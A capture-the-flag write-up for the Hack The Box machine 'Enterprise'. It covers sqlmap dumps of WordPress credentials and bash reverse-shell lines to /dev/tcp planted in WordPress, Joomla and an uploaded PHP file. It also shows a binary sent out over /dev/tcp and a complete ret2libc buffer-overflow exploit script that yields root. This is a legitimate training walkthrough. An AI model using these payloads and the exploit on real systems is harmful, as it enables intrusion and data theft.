[*] starting @ 19:08:33 /2020-07-22/

[19:08:33] [INFO] testing connection to the target URL
---SNIP---
Database: wordpress
Table: wp_users
[1 entry]
+------+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
| ID   | user_url | user_pass                          | user_email                   | user_login    | user_status | display_name  | user_nicename | user_registered     | user_activation_key |
+------+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+
| 1    | <blank>  | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. | william.riker@enterprise.htb | william.riker | 0           | william.riker | william-riker | 2017-09-03 19:20:56 | <blank>             |
+------+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+

[19:08:55] [INFO] table 'wordpress.wp_users' dumped to CSV file '/home/pwnd_root/.sqlmap/output/10.10.10.61/dump/wordpress/wp_users.csv'
[19:08:55] [INFO] fetched data logged to text files under '/home/pwnd_root/.sqlmap/output/10.10.10.61'
[19:08:55] [WARNING] you haven't updated sqlmap for more than 92 days!!!

[*] ending @ 19:08:55 /2020-07-22/

```
**wordpress-** ***wp_posts***
``` shell 
[pwnd_root@manjaro Enterprise]$ sqlmap -u http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=1 --dbms=mysql -D wordpress -T wp_posts --dump
---SNIP---
      | <blank>      | 0             | 2017-09-06 14:28:35 | 2017-09-06 15:28:35 | <blank>       | closed         | <blank>        | 2017-09-06 14:28:35 | <blank>               
| 
| http://enterprise.htb/?p=68                                                      | 68   | <blank> | <blank> | 2017-09-06 15:40:30 | 66-revision-v1                       | revi
sion            | 0          | Passwords                       | closed      | 1           | 66          | inherit     | Needed somewhere to put some passwords quickly\r\n\r\nZx
JyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n 

```
From the three dumps, the following usernames and passwords were identified. <br>
**Usernames**       <br>
*william.riker*     <br>
*geordi.la.forge*   <br>
**Passwords**       <br>
*ZxJyhGem4k338S2Y*  <br>
*enterprisencc170*  <br>
*ZD3YxfnSjezg67JZ*  <br>
*u\*Z14ru0p#ttj83zS6*<br>

## Initial Foothold
Assuming that these identified credentials work, there are now two possible entry points. One, through *WordPress* 
 and the other through *Joomla*.

> Note: Add 'enterprise.htb    10.10.10.61' to /etc/hosts. Identified through lcars.php and nikto scans

### WordPress
On the Wordpress admin panel, [http://enterprise.htb/wp-login.php](http://enterprise.htb/wp-login.php), with the user
as *william.riker*, login attempts were carried with the identified passwords. The credentials that worked was 
***william.riker:u\*Z14ru0p#ttj83zS6***. Upon login, the *lcars.php* file, found on *Plugins* section was edited to 
add the following line. 
```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/9095 0>&1'");
```
Browsing to [http://10.10.10.61/wp-content/plugins/lcars/lcars.php ](http://10.10.10.61/wp-content/plugins/lcars/lcars.php )
resulted in a reverse shell being caught on the attacking host on port 9095. However, the *user.txt* informed that this
is not the *Enterprise* and enumerating further showed that the shell was from a *Docker Container*.
<br> **user.txt**
```text
As you take a look around at your surroundings you realise there is something wrong.
This is not the Enterprise!
As you try to interact with a console it dawns on you.
Your in the Holodeck!
```
*[Image: WordPress Shell]*

Keeping this aside, another attempt at a reverse shell through *Joomla* was carried out.

### Joomla
On the Joomla admin panel, [http://enterprise.htb:8080/administrator](http://enterprise.htb:8080/administrator),
with the user as *geordi.la.forge*, login attempts were carried with the identified passwords. The credentials that 
worked in this case was ***geordi.la.forge:ZD3YxfnSjezg67JZ***. Similar to the WordPress method, the file *index.php*, 
found on Extensions -> Templates -> Templates -> Protostar Details and Files was edited to add the following line.
```php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/9090 0>&1'");
```
Browsing to [http://enterprise.htb:8080/index.php](http://enterprise.htb:8080/index.php), triggers the reverse shell and
the same is caught on port 9090 of the attacking host. However, the result was the same, as this is another docker
container.
*[Image: Joomal Shell]*
Therefore, the only way forward is to break out of this container. 

### User shell
Enumerating further, on the Joomla shell showed that ```/var/www/html``` contains both *files* directory and the 
wordpress files, indicating this could be from the target system.
```terminal 
www-data@a7018bfdc454:/var/www/html$ ls -la
total 16988
drwxr-xr-x 18 www-data www-data    4096 Sep  8  2017 .
drwxr-xr-x  4 root     root        4096 Jul 24  2017 ..
-rw-r--r--  1 www-data www-data    3006 Sep  3  2017 .htaccess
-rw-r--r--  1 www-data www-data   18092 Aug 14  2017 LICENSE.txt
-rw-r--r--  1 www-data www-data    4874 Aug 14  2017 README.txt
drwxr-xr-x 11 www-data www-data    4096 Aug 14  2017 administrator
drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 bin
drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 cache
drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 cli
drwxr-xr-x 20 www-data www-data    4096 Sep  3  2017 components
-r--r--r--  1 www-data www-data    3053 Sep  6  2017 configuration.php
-rwxrwxr-x  1 www-data www-data    3131 Sep  7  2017 entrypoint.sh
drwxrwxrwx  2 root     root        4096 Jul 22 14:48 files
-rw-rw-rw-  1 www-data www-data 5457775 Sep  8  2017 fs.out
-rw-rw-rw-  1 www-data www-data 8005634 Sep  8  2017 fsall.out
-rw-rw-rw-  1 www-data www-data 2044787 Sep  7  2017 goonthen.txt
-rw-r--r--  1 www-data www-data    3005 Aug 14  2017 htaccess.txt
drwxr-xr-x  5 www-data www-data    4096 Sep  6  2017 images
drwxr-xr-x  2 www-data www-data    4096 Aug 14  2017 includes
-rw-r--r--  1 www-data www-data    1420 Aug 14  2017 index.php
drwxr-xr-x  4 www-data www-data    4096 Aug 14  2017 language
drwxr-xr-x  5 www-data www-data    4096 Aug 14  2017 layouts
drwxr-xr-x 11 www-data www-data    4096 Aug 14  2017 libraries
-rw-rw-r--  1 www-data www-data     968 Sep  7  2017 makedb
-rw-rw-r--  1 www-data www-data     968 Sep  7  2017 makedb.php
drwxr-xr-x 26 www-data www-data    4096 Aug 14  2017 media
-rw-rw-rw-  1 www-data www-data 1474911 Sep  7  2017 mod.out
drwxr-xr-x 27 www-data www-data    4096 Aug 14  2017 modules
-rw-rw-rw-  1 www-data www-data  252614 Sep  7  2017 onemoretry.txt
-rw-rw-rw-  1 www-data www-data     793 Sep  8  2017 out.zip
drwxr-xr-x 16 www-data www-data    4096 Aug 14  2017 plugins
-rw-r--r--  1 www-data www-data     836 Aug 14  2017 robots.txt
drwxr-xr-x  5 www-data www-data    4096 Aug 14  2017 templates
drwxr-xr-x  2 www-data www-data    4096 Sep  6  2017 tmp
-rw-r--r--  1 www-data www-data    1690 Aug 14  2017 web.config.txt
-rw-r--r--  1 www-data www-data    3736 Sep  6  2017 wordpress-shell.php
```
With *write* access to the directory files, a php file named **reverse.php** that triggers reverse shell was placed
on the directory.
```terminal 
www-data@a7018bfdc454:/var/www/html/files$ ls -l
ls -l
total 8
-rw-r--r-- 1 root     root     1406 Oct 17  2017 lcars.zip
-rw-r--r-- 1 www-data www-data   76 Jul 22 14:48 reverse.php
www-data@a7018bfdc454:/var/www/html/files$ cat reverse.php
cat reverse.php
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.11/9000 0>&1'"); ?>
``` 
Browsing to [https://10.10.10.61/files/reverse.php](https://10.10.10.61/files/reverse.php), triggered the reverse 
shell and was caught on port 9000 on the attacking host. The screenshot given below confirms that the shell is from the 
target and also the user hash.

*[Image: User Shell]*

## Privilege Escalation
The enumeration of network connections on the target showed that it has two ports 5355 and 32812 listening for 
connections, that are not listed on the nmap scan.
```terminal
www-data@enterprise:/home/jeanlucpicard$ netstat -antup
netstat -antup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
---SNIP--- 
```
Connecting to both ports through *netcat* showed that port 32812 is running a service named *lcars*. 
```terminal 
[pwnd_root@manjaro Enterprise]$ nc -nv 10.10.10.61 5355
^CExiting.
[pwnd_root@manjaro Enterprise]$ nc -nv 10.10.10.61 32812
10.10.10.61 32812 open

                 _______ _______  ______ _______
          |      |       |_____| |_____/ |______
          |_____ |_____  |     | |    \_ ______|

Welcome to the Library Computer Access and Retrieval System

Enter Bridge Access Code:
```
Searching for the binary showed that it is located on ```/bin/lcars```. The binary was transferred to the attacking host
for analysis, by converting it into base64, as follows.
```terminal
# On the target
www-data@enterprise:/bin$ ls -l lcars 
ls -l lcars 
-rwsr-xr-x 1 root root 12152 Sep  8  2017 lcars 
www-data@enterprise:/bin$ base64 lcars > /dev/tcp/10.10.14.11/8080 
base64 lcars > /dev/tcp/10.10.14.11/8080

# On the attacking host
[pwnd_root@manjaro Enterprise]$ nc -nvlp 8080 > lcars.base64 
Connection from 10.10.10.61:52832 
[pwnd_root@manjaro Enterprise]$ base64 -d lcars.base64 > lcars.binary 
```
> The lcars plugin is custom-built plugin, with imperfections, therefore, it is safe to assume that the lcars binary could 
> present some imperfections that can exploited.

The base64 file was decoded and converted back into lcars binary. Executing the binary, asked for an access code which
was found to be **picarda1** through *ltrace* as follows.
```terminal
[pwnd_root@manjaro Enterprise]$ ltrace ./lcars.binary  
__libc_start_main(0x56652c91, 1, 0xffdc65b4, 0x56652d30 <unfinished ...> 
---SNIP--
fgets( 
"\n", 9, 0xf7edb540)                                                                                   = 0xffdc64e7 
strcmp("\n", "picarda1")                                                                                     = -1 
---SNIP---
exit(0 <no return ...> 
+++ exited (status 0) +++
```

### Buffer Overflow
The binary was executed again, and with the identified access code, it was enumerated further. The enumeration 
identified that the **Security Override** under *Security* control has a buffer overflow vulnerability. 
> A string of 500 'A's were supplied as input to the security override option, causing the crash.

``` terminal
[pwnd_root@manjaro Enterprise]$ ./lcars.binary  
 
                 _______ _______  ______ _______ 
          |      |       |_____| |_____/ |______ 
          |_____ |_____  |     | |    \_ ______| 
 
Welcome to the Library Computer Access and Retrieval System 
 
Enter Bridge Access Code:  
picarda1 
 
                 _______ _______  ______ _______ 
          |      |       |_____| |_____/ |______ 
          |_____ |_____  |     | |    \_ ______| 
 
Welcome to the Library Computer Access and Retrieval System 
 
 
 
LCARS Bridge Secondary Controls -- Main Menu:  
 
1. Navigation 
2. Ships Log 
3. Science 
4. Security 
5. StellaCartography 
6. Engineering 
7. Exit 
Waiting for input:  
4 
Disable Security Force Fields 
Enter Security Override: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Segmentation fault (core dumped)
```

The same was replicated under gdb. But first an unique pattern of 500 characters was created and was supplied to 
**Security Override**. After the crash, the memory value of *$eip* was searched and the offset was found to be **212**.
```console
[ Legend: Modified register | Code | Heap | Stack | String ] 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── 
$eax   : 0x216      
$ebx   : 0x63616162 ("baac"?) 
$ecx   : 0xffffcb40  →  0xf7f88ce0  →  0xfbad2a84 
$edx   : 0x0        
$esp   : 0xffffcd20  →  "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]" 
$ebp   : 0x63616163 ("caac"?) 
$esi   : 0xf7f87e24  →  0x001e7d2c 
$edi   : 0xf7f87e24  →  0x001e7d2c 
$eip   : 0x63616164 ("daac"?) 
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification] 
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 
0xffffcd20│+0x0000: "eaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqa[...]"    ← $esp 
0xffffcd24│+0x0004: "faacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacra[...]" 
0xffffcd28│+0x0008: "gaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsa[...]" 
0xffffcd2c│+0x000c: "haaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaacta[...]" 
0xffffcd30│+0x0010: "iaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacua[...]" 
0xffffcd34│+0x0014: "jaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacva[...]" 
0xffffcd38│+0x0018: "kaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwa[...]" 
0xffffcd3c│+0x001c: "laacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxa[...]" 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ──── 
[!] Cannot disassemble from $PC 
[!] Cannot access memory at address 0x63616164 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── 
[#0] Id 1, Name: "lcars.binary", stopped 0x63616164 in ?? (), reason: SIGSEGV 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──── 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 
gef➤  pattern search 0x63616164 
[+] Searching '0x63616164' 
[+] Found at offset 212 (little-endian search) likely 
[+] Found at offset 308 (big-endian search) 
```
The contents of ```/proc/sys/kernel/randomize_va_space```, confirms that the target does not have **ASLR** enabled.
```console
www-data@enterprise:/bin$ cat /proc/sys/kernel/randomize_va_space 
cat /proc/sys/kernel/randomize_va_space 
0
```
With no ASLR protection, all that is needed are the addresses of *system, exit* and *sh*. The same are found 
on the target as follows.
```console
(gdb) p system 
$3 = {<text variable, no debug info>} 0xf7e4c060 <system> 
(gdb) p exit 
$4 = {<text variable, no debug info>} 0xf7e3faf0 <exit> 
(gdb) find &system,+9999999, "/bin/sh" 
0xf7f70a0f 
warning: Unable to access 16000 bytes of target memory at 0xf7fca797, halting search. 
1 pattern found. 
(gdb) find &system,+9999999, "sh" 
0xf7f6ddd5 
0xf7f6e7e1 
0xf7f70a14 
0xf7f72582 
warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search. 
4 patterns found.
```
Technically, ```212*'A' + system + exit + sh``` should spawn a root shell.

### Root Access
With the previous findings and the open port 32812 running the vulnerable service, the following python script was 
written to spawn a root shell, by exploiting the buffer overflow on *lcars*. 
Source code[^footnote]

```python
#!/usr/bin/env python2

import struct
from pwn import *

RHOST = '10.10.10.61'
RPORT = 32812

def conv (num):
    return struct.pack ('<I',num)

payload = 'A' * 212
payload += conv (0xf7e4c060) # system()
payload += conv (0xf7e3faf0) # exit()
payload += conv (0xf7f6ddd5) # 'sh'

sess = remote (RHOST, RPORT)
sess.recvuntil ("Enter Bridge Access Code: ")
sess.sendline ("picarda1")
sess.recvuntil ("Waiting for input: ")
sess.sendline ("4")
sess.recvuntil ("Enter Security Override:")
sess.sendline (payload)
sess.interactive ()
```
Executing the script, spawned a root shell back to the attacking host as shown in the screenshot given below.

*[Image: Root Shell]*

## Footnotes
[^footnote]:[https://github.com/pwnd-root/exploits-and-stuff/blob/master/lcarsRoot.py](https://github.com/pwnd-root/exploits-and-stuff/blob/master/lcarsRoot.py) 